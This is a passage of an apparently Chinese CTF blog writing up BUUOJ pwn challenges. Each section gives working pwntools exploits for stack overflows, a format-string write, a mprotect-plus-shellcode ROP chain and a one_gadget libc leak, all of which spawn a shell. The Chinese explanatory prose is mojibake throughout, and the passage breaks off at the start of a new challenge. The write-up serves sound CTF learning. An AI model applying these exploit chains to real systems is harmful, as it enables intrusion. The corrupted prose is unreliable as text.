<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x804c044</span>:<span class="number">0x1</span>&#125;)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn'</span>)<span class="comment">#p = remote('node3.buuoj.cn',25595)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(str(<span class="number">0x1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/09/18/81KUdhp5EWb2JgP.png" alt="image.png"></p>
<h1 id="0x00B-BJDCTF-2nd-r2t3-integer-overflow-ret2text"><a href="#0x00B-BJDCTF-2nd-r2t3-integer-overflow-ret2text" class="headerlink" title="0x00B.[BJDCTF 2nd]r2t3 - integer overflow + ret2text"></a>0x00B.[BJDCTF 2nd]r2t3 - integer overflow + ret2text</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/18/KoFCaQM71JZzNgA.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>ä¸»å‡½æ•°ä¸­è¯»å…¥æœ€å¤§0x400ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯å¼€è¾Ÿäº†0x408å­—èŠ‚çš„ç©ºé—´ï¼Œæ— æ³•æº¢å‡º</p>
<p><img src="https://i.loli.net/2020/10/07/usMxPdgyVGUtAEB.png" alt="image.png"></p>
<p>åŒæ—¶ä¸»å‡½æ•°ä¼šå°†è¾“å…¥ä¼ å…¥<code>name_check()</code>å‡½æ•°ä¸­ï¼Œè‹¥é€šè¿‡<code>strlen()</code>è®¡ç®—å‡ºæ¥çš„é•¿åº¦åœ¨4~8ä¸ªå­—èŠ‚ä¹‹é—´åˆ™ä¼šå°†æˆ‘ä»¬çš„è¾“å…¥é€šè¿‡<code>strcpy()</code>æ‹·è´è‡³<code>dest</code>ä¸Šï¼Œè€Œè¿™é‡Œåˆ°ebpä¹‹é—´åªæœ‰<code>0x11</code>ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥é€šè¿‡è¿™æ®µä»£ç è¦†ç›–æ‰è¯¥å‡½æ•°çš„è¿”å›åœ°å€</p>
<p><img src="https://i.loli.net/2020/09/18/GlzDVrQKSOiykoN.png" alt="image.png"></p>
<p>åŒæ—¶æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„åé—¨å‡½æ•°</p>
<p><img src="https://i.loli.net/2020/09/18/QNlFfbPJyCDL9I5.png" alt="image.png"></p>
<p>è€ƒè™‘åˆ°åœ¨<code>name_check()</code>å‡½æ•°ä¸­ç”¨æ¥å­˜æ”¾è¾“å…¥é•¿åº¦çš„å˜é‡ä¸º8ä½æ— ç¬¦å·æ•´å‹ï¼ŒèŒƒå›´ä¸º0~255ï¼Œæ•…æˆ‘ä»¬åªéœ€è¦è¾“å…¥260ä¸ªå­—èŠ‚ä¾¿å¯ä»¥å‘ç”Ÿä¸Šæº¢é™ä½¿è¯¥å˜é‡çš„å€¼ä¸Šæº¢ä¸º4ï¼Œç»•è¿‡åˆ¤å®š</p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x11</span> + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x804858b</span>) + <span class="string">b'A'</span> * (<span class="number">260</span> - <span class="number">4</span> - <span class="number">4</span> - <span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./r2t3'</span>)<span class="comment">#p = remote('node3.buuoj.cn',25595)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>å‘é€payloadå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/09/18/XmBDE6Lk8UHlN1R.png" alt="image.png"></p>
<h1 id="0x00C-get-started-3dsctf-2016-ret2text-ret2shellcode"><a href="#0x00C-get-started-3dsctf-2016-ret2text-ret2shellcode" class="headerlink" title="0x00C.get_started_3dsctf_2016 - ret2text || ret2shellcode"></a>0x00C.get_started_3dsctf_2016 - ret2text || ret2shellcode</h1><blockquote>
<p>æ³¨ï¼šè¿™æ˜¯ä¸€é“å±‘é¢˜</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/18/XZEnHkaoDL6puN4.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå¯ä»¥å‘ç°å­˜åœ¨ä¸€ä¸ªèµ¤è£¸è£¸çš„<code>gets()</code>æº¢å‡º</p>
<p><img src="https://i.loli.net/2020/09/18/KHx7Dz9kULZpIRd.png" alt="image.png"></p>
<p>åŒæ—¶å­˜åœ¨ä¸€ä¸ª<code>get_flag()</code>å‡½æ•°å¯ä»¥è·å–flagï¼Œä¸è¿‡è¦æ±‚å‚æ•°1ä¸º<code>0x308cd64f</code>ï¼Œå‚æ•°2ä¸º<code>0x195719d1</code></p>
<p><img src="https://i.loli.net/2020/09/18/H7PwgMDErGxZcRi.png" alt="image.png"></p>
<h2 id="è§£æ³•1ï¼šret2text"><a href="#è§£æ³•1ï¼šret2text" class="headerlink" title="è§£æ³•1ï¼šret2text"></a>è§£æ³•1ï¼šret2text</h2><p>32ä½ç¨‹åºé€šè¿‡æ ˆä¼ å‚ï¼Œæ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x38</span> + p32(<span class="number">0x80489A0</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x308CD64F</span>) + p32(<span class="number">0x195719D1</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./get_started_3dsctf_2016'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>ä¸è¿‡å¾ˆæ˜æ˜¾ï¼Œå‡ºé¢˜äººçš„ç¯å¢ƒå¾ˆæ˜æ˜¾æœ‰ä¸¶å°é—®é¢˜ğŸ”¨ğŸ”¨ğŸ”¨ï¼Œè¿œç¨‹è·‘ä¸é€šè¿™ä¸ªpayload</p>
<p><img src="https://i.loli.net/2020/10/07/6ZxFokbJUwI2YVS.png" alt="image.png"></p>
<p>é—®é¢˜å‡ºåœ¨å“ªå‘¢ï¼Ÿè¯¥ç¨‹åºå°è¯•æ‰“å¼€çš„æ˜¯<code>flag.txt</code>æ–‡ä»¶ï¼Œä½†æ˜¯å¹³å°æ‰€è‡ªåŠ¨ç”Ÿæˆçš„æ˜¯<code>flag</code>æ–‡ä»¶ï¼Œæ•…æ­¤ç§æ–¹æ³•<strong>æ— æ³•è·å¾—flag</strong></p>
<p>æˆ‘ä»¬å°è¯•å¯»æ‰¾ç¬¬äºŒç§è§£æ³•</p>
<h2 id="è§£æ³•2ï¼šret2shellcode"><a href="#è§£æ³•2ï¼šret2shellcode" class="headerlink" title="è§£æ³•2ï¼šret2shellcode"></a>è§£æ³•2ï¼šret2shellcode</h2><p>é¦–å…ˆæˆ‘ä»¬å‘ç°åœ¨ç¨‹åºä¸­ç¼–å…¥äº†å¤§é‡çš„å‡½æ•°ï¼Œå…¶ä¸­å°±åŒ…æ‹¬<code>mprotect()</code>ï¼Œå¯ä»¥ä¿®æ”¹æŒ‡å®šå†…å­˜åœ°å€çš„æƒé™</p>
<p><img src="https://i.loli.net/2020/09/19/JX5nSQwg9dFTufU.png" alt="image.png"></p>
<p>æ•…è€ƒè™‘ä½¿ç”¨<code>mprotect()</code>ä¿®æ”¹å†…å­˜æ®µæƒé™ä¸ºå¯è¯»å¯å†™å¯è¿è¡Œååœ¨ä¸Šé¢å†™å…¥shellcodeå¹¶è·³è½¬è‡³å†…å­˜æ®µæ‰§è¡Œshellcodeä»¥getshell</p>
<p>åœ¨<strong>pwndbg</strong>ä¸­ä½¿ç”¨<code>vmmap</code>æŸ¥çœ‹å¯ä»¥ç”¨çš„å†…å­˜æ®µï¼Œå‰é¢ä¸‰ä¸ªæ®µéšä¾¿é€‰ä¸€ä¸ªå°±è¡Œ</p>
<p><img src="https://i.loli.net/2020/09/20/1nXPY9VqgLaQtmR.png" alt="image.png"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨å°†<code>mprotect()</code>çš„å‚æ•°å¼¹å‡ºï¼ˆæ—¥å¸¸è¸©å‘ï¼‰</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./get_started_3dsctf_2016'</span>)<span class="comment">#p = remote('node3.buuoj.cn',29719)#</span></span><br><span class="line">e = ELF(<span class="string">'./get_started_3dsctf_2016'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">pop_ebx_esi_edi_ebp_ret = <span class="number">0x804951c</span></span><br><span class="line">mprotect_addr = e.sym[<span class="string">'mprotect'</span>]</span><br><span class="line">read_addr = e.sym[<span class="string">'read'</span>]</span><br><span class="line">sc_addr = <span class="number">0x80ec000</span></span><br><span class="line">offset = <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'A'</span>*offset + p32(mprotect_addr) + p32(pop_ebx_esi_edi_ebp_ret) + p32(sc_addr) + p32(<span class="number">0x100</span>) + p32(<span class="number">0x7</span>) + p32(<span class="number">0xdeadbeef</span>)  + p32(read_addr) + p32(sc_addr) + p32(<span class="number">0</span>) + p32(sc_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¯getshell</p>
<p><img src="https://i.loli.net/2020/09/20/dk9jnLSZRt1qwXO.png" alt="image.png"></p>
<h1 id="0x00D-ciscn-2019-n-8-overwrite"><a href="#0x00D-ciscn-2019-n-8-overwrite" class="headerlink" title="0x00D.ciscn_2019_n_8 - overwrite"></a>0x00D.ciscn_2019_n_8 - overwrite</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°å¼€äº†<strong>æ ˆä¸å¯æ‰§è¡Œã€åœ°å€éšæœºåŒ–ã€Canary</strong>ä¸‰å¤§ä¿æŠ¤ï¼ˆ<del>å™”  å™”  å’š</del></p>
<p><img src="https://i.loli.net/2020/09/20/OqJDm4QUE367nWM.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/09/20/2dOMiusme5lUfhc.png" alt="image.png"></p>
<p>ä½¿ç”¨scanfè¯»å…¥å­—ç¬¦ä¸²åˆ°å˜é‡<code>var</code>ï¼Œå­˜åœ¨æ¼æ´ï¼ŒåŒæ—¶ç¨‹åºä¼šå°†varçš„åœ°å€è½¬æ¢ä¸ºä¸€ä¸ª(_QWORD)ç±»å‹æŒ‡é’ˆï¼ˆé•¿åº¦ä¸ºå››å­—èŠ‚ï¼‰ï¼Œå¹¶åˆ¤æ–­<code>var[13]</code>æ˜¯å¦ä¸º<code>0x11</code>ï¼Œè‹¥æ˜¯åˆ™è¿”å›ä¸€ä¸ªshell</p>
<p>æ•…è€ƒè™‘ç›´æ¥è¾“å…¥å°†<code>var[13]</code>è¦†å†™ä¸º<code>0x11</code>å³å¯getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">13</span>*<span class="number">4</span> + p32(<span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./ciscn_2019_n_8'</span>) <span class="comment"># p = remote('node3.buuoj.cn',29901)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/09/20/4RHWBEUrOSaPhXw.png" alt="image.png"></p>
<h1 id="0x00E-not-the-same-3dsctf-2016-ret2shellcode"><a href="#0x00E-not-the-same-3dsctf-2016-ret2shellcode" class="headerlink" title="0x00E.not_the_same_3dsctf_2016 - ret2shellcode"></a>0x00E.not_the_same_3dsctf_2016 - ret2shellcode</h1><blockquote>
<p>not the sameï¼ˆæŒ‡ the sameï¼ˆ</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/20/lxh7UmuzOJIRvbW.png" alt="image.png"></p>
<p>æ‹–è¿›IDAé‡Œåº·åº·</p>
<p><img src="https://i.loli.net/2020/09/20/FGmtAInhU9Dcx1a.png" alt="image.png"></p>
<p>ä¸»å‡½æ•°ä¸­ç›´æ¥å­˜åœ¨å¯ä»¥è¢«åˆ©ç”¨çš„<code>gets()</code>å‡½æ•°ï¼ŒåŒæ—¶è¿˜ç»™äº†æˆ‘ä»¬ä¸€ä¸ªæç¤ºä¿¡æ¯â€”â€”<strong>bora ver se tu ah o bichao memo</strong>ï¼Œå¤§è‡´å¯ä»¥ç¿»è¯‘ä¸ºï¼š<strong>Did you see the wrong note?</strong><del>çœ‹èµ·æ¥ä¼¼ä¹æ²¡ä»€ä¹ˆç”¨çš„æ ·å­</del></p>
<p>å°è¯•å…ˆä½¿ç”¨ä¸å‰ä¸€é¢˜ç›¸åŒçš„æ€è·¯æ¥è§£</p>
<p>é¦–å…ˆç”¨<code>pwndbg</code>çš„<code>vmmap</code>æŸ¥çœ‹å¯ä»¥ç”¨çš„å†…å­˜</p>
<p><img src="https://i.loli.net/2020/09/20/3MkHWsKtXChuezG.png" alt="image.png"></p>
<p>åŒæ—¶IDAä¸­æˆ‘ä»¬å‘ç°ç¨‹åºä¸­ä¾ç„¶å­˜åœ¨<code>mprotect()</code>å‡½æ•°å¯ä»¥æ”¹å†™æƒé™</p>
<p><img src="https://i.loli.net/2020/09/20/4IebV5KgXMrA9Go.png" alt="image.png"></p>
<p>å’Œå‰ä¸€é¢˜æ‰€ä¸åŒçš„æ˜¯gadgetçš„ä½ç½®æœ‰ä¸¶å°å˜åŒ–ï¼ˆ<del>åŸæ¥åªæœ‰è¿™ä¸ªä¸åŒğŸ</del>ï¼‰</p>
<p><img src="https://i.loli.net/2020/09/20/b8JLWav12ru9SFE.png" alt="image.png"></p>
<p>æ•…æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>ä¸å‰ä¸€é¢˜å‡ ä¹å®Œå…¨ç›¸åŒçš„exp</strong>æ¥getshellï¼Œåªéœ€è¦æŠŠcsué‡Œçš„gadgetçš„åœ°å€ç¨å¾®ä¿®æ”¹ä¸€ä¸‹å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./not_the_same_3dsctf_2016'</span>)<span class="comment">#p = remote('node3.buuoj.cn',28147)#</span></span><br><span class="line">e = ELF(<span class="string">'./not_the_same_3dsctf_2016'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">pop_ebx_esi_edi_ebp_ret = <span class="number">0x80494dc</span></span><br><span class="line">mprotect_addr = e.sym[<span class="string">'mprotect'</span>]</span><br><span class="line">read_addr = e.sym[<span class="string">'read'</span>]</span><br><span class="line">sc_addr = <span class="number">0x80ea000</span></span><br><span class="line">offset = <span class="number">0x2d</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'A'</span>*offset + p32(mprotect_addr) + p32(pop_ebx_esi_edi_ebp_ret) + p32(sc_addr) + p32(<span class="number">0x100</span>) + p32(<span class="number">0x7</span>) + p32(<span class="number">0xdeadbeef</span>)  + p32(read_addr) + p32(sc_addr) + p32(<span class="number">0</span>) + p32(sc_addr) + p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">payload2 = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¾—shell</p>
<p><img src="https://i.loli.net/2020/09/20/WNngpZqb32UfarH.png" alt="image.png"></p>
<h1 id="0x00F-one-gadget-one-gadget"><a href="#0x00F-one-gadget-one-gadget" class="headerlink" title="0x00F.one_gadget - one_gadget"></a>0x00F.one_gadget - one_gadget</h1><blockquote>
<p> é¦–å…ˆä»é¢˜ç›®åå­—æˆ‘ä»¬å°±å¯ä»¥çœ‹å‡ºè¿™é“é¢˜åº”è¯¥éœ€è¦æˆ‘ä»¬ç”¨åˆ°ä¸€ä¸ªå·¥å…·â€”â€”<a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">one_gadget</a></p>
<p> ä»€ä¹ˆæ˜¯one_gadgetï¼Ÿå³åœ¨libcä¸­å­˜åœ¨ç€çš„å¯ä»¥ç›´æ¥getshellçš„gadget</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°<strong>ä¿  æŠ¤  å…¨  å¼€</strong>ï¼ˆ<strong>å¿ƒ è‚º åœ æ­¢</strong></p>
<p><img src="https://i.loli.net/2020/09/20/LrGYDRVBwkmJ49K.png" alt="image.png"></p>
<p>æ‹–è¿›IDAé‡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/09/20/sh7PJmrCWN2fRBv.png" alt="image.png"></p>
<p>ä¸»å‡½æ•°ä¼šè¯»å…¥ä¸€ä¸ªæ•´æ•°åˆ°<strong>å‡½æ•°æŒ‡é’ˆ</strong>v4ä¸­ï¼Œå¹¶å°è¯•æ‰§è¡Œ<code>v4()</code>ï¼Œæ•…æˆ‘ä»¬åªéœ€è¦è¾“å…¥<strong>one_gadget</strong>çš„åœ°å€å³å¯getshell</p>
<p>ä½¿ç”¨<code>one_gadget</code>å·¥å…·å¯ä»¥æ‰¾å‡ºlibcä¸­çš„getshell gadget</p>
<blockquote>
<p>ä¸æ˜åŸå› åœ¨archä¸Šä¸€ç›´æ²¡æ³•è¿è¡Œï¼Œåªå¥½åˆ‡åˆ°Ubuntu</p>
</blockquote>
<p><img src="https://i.loli.net/2020/09/20/I5t8xJdkwloaGeA.png" alt="image.png"></p>
<p>ä½†æ˜¯æˆ‘ä»¬è¿˜éœ€è¦çŸ¥é“libcçš„åŸºå€</p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨<code>init()</code>å‡½æ•°ä¸­ä¼šè¾“å‡º<code>printf()</code>å‡½æ•°çš„åœ°å€ï¼Œæœ‰äº†è¿™ä¸ªæˆ‘ä»¬ä¾¿å¯ä»¥è®¡ç®—å‡ºlibcçš„åŸºå€ï¼Œä¹Ÿå°±æœ‰äº†one_gadgetçš„çœŸå®åœ°å€</p>
<p>è€Œé¢˜ç›®ä¹Ÿç»™äº†æˆ‘ä»¬libcï¼Œæ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">one_gadget = <span class="number">0xe237f</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./one_gadget'</span>)<span class="comment">#p = remote('node3.buuoj.cn',27792)#</span></span><br><span class="line">e = ELF(<span class="string">'./one_gadget'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.29.so'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'here is the gift for u:'</span>)</span><br><span class="line">printf_addr = u64(p.recvuntil(<span class="string">'\n'</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">libc_base = printf_addr - libc.sym[<span class="string">'printf'</span>]</span><br><span class="line">getshell = libc_base + one_gadget</span><br><span class="line">p.sendline(str(getshell))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="0x010-jarvisoj-level2-ret2text"><a href="#0x010-jarvisoj-level2-ret2text" class="headerlink" title="0x010.jarvisoj_level2 - ret2text"></a>0x010.jarvisoj_level2 - ret2text</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/21/Fy45LtX2TbDZmCw.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/09/21/udFMIAQECL71B3D.png" alt="image.png"></p>
<p>è¯»å…¥æœ€å¤§0x100å­—èŠ‚ï¼Œä½†æ˜¯<code>buf</code>åˆ°ebpä¹‹é—´åªæœ‰0x88å­—èŠ‚çš„ç©ºé—´ï¼Œå­˜åœ¨æº¢å‡º</p>
<p>åŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥çŸ¥é“è¯¥ç¨‹åºä¸­æœ‰<code>system()</code>å‡½æ•°å¯ä»¥åˆ©ç”¨</p>
<p>åŒæ—¶ç¨‹åºä¸­è¿˜å­˜åœ¨<code>&quot;/bin/sh&quot;</code>å­—ç¬¦ä¸²</p>
<p><img src="https://i.loli.net/2020/09/21/ODpha1fMLGsxdHN.png" alt="image.png"></p>
<p>æ•…åªéœ€è¦æ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./level2'</span>)<span class="comment">#p = remote('node3.buuoj.cn',26276)#</span></span><br><span class="line">e = ELF(<span class="string">'./level2'</span>)</span><br><span class="line">sh_addr = <span class="number">0x804A024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x88</span> + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">'system'</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/09/21/1SBivHVUXTmd6rM.png" alt="image.png"></p>
<h1 id="0x011-HarekazeCTF2019-baby-rop-ret2text-ret2csu"><a href="#0x011-HarekazeCTF2019-baby-rop-ret2text-ret2csu" class="headerlink" title="0x011.[HarekazeCTF2019]baby_rop - ret2text + ret2csu"></a>0x011.[HarekazeCTF2019]baby_rop - ret2text + ret2csu</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/09/21/KLwbUyHQnN3YWTR.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/09/21/ERABfyXm6k1dvZl.png" alt="image.png"></p>
<p>ä½¿ç”¨<code>scanf(&quot;%s&quot;)</code>è¯»å…¥å­—ç¬¦ä¸²ï¼Œå­˜åœ¨æº¢å‡ºæ¼æ´</p>
<p><img src="https://i.loli.net/2020/09/21/OSY69XjyadgBbV2.png" alt="image.png"></p>
<p>å­˜åœ¨<code>system()</code>å‡½æ•°</p>
<p><img src="https://i.loli.net/2020/09/21/IX7bcApO3V8axJ1.png" alt="image.png"></p>
<p>å­˜åœ¨<code>/bin/sh</code>å­—ç¬¦ä¸²</p>
<p>æ•…è€ƒè™‘ä½¿ç”¨csuä¸­gadgetæ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å‡½æ•°ä»¥getshell</p>
<p><img src="https://i.loli.net/2020/09/21/jJeyg9MLalYGnZX.png" alt="image.png"></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x601048</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27558</span>)</span><br><span class="line">e = ELF(<span class="string">'./babyrop'</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">0x10</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) +  p64(sh_addr) + p64(e.sym[<span class="string">'system'</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2020/09/21/P4QqLJyplu2xF9r.png" alt="image.png"></p>
<blockquote>
<p>å¥½å¤šä¸€æ ·çš„é¢˜å•ŠOr2</p>
</blockquote>
<h1 id="0x012-bjdctf-2020-babystack-ret2text"><a href="#0x012-bjdctf-2020-babystack-ret2text" class="headerlink" title="0x012.bjdctf_2020_babystack - ret2text"></a>0x012.bjdctf_2020_babystack - ret2text</h1><blockquote>
<p>åˆæ˜¯ä¸€æ¨¡ä¸€æ ·çš„é¢˜ã€‚ã€‚ã€‚</p>
</blockquote>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
